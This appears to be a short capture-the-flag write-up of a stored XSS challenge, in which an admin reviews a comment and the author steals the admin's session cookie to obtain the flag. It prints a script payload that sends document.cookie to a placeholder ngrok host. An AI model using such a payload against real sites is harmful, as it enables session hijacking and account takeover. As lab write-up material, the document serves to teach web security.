#xss #cookie #cross-site
The main page is a login page that looks like this:
![[Pasted image 20230622234332.png]]

By signing up we get this post and a bar that we can comment to:
![[Pasted image 20230622234511.png]]

the comment needs to be reviewed it says when we comment:
![[Pasted image 20230622234859.png]]

it is also reflected in the source code as it is:
![[Pasted image 20230622234936.png]]

can we try html to it?
![[Pasted image 20230622235024.png]]
and it works!!!!! 
so basically what I think is to get admin level cookie or something from the server via XSS , the actual impact of XSS what we can do is to be done here
so let's fire up our server and redirect the request to it:
first we start our python web server locally and then tunnel it via ngrok:
the url looks like this:
```js
<script>new image().src='https://your-ngrok-server-link.ngrok-free.app?c='+document.cookie</script>`
```
![[Pasted image 20230623001239.png]]
and we get the cookie 
the first one is ours the 2nd one is of admin
and by setting the cookie we get the flag:
![[Pasted image 20230623001121.png]]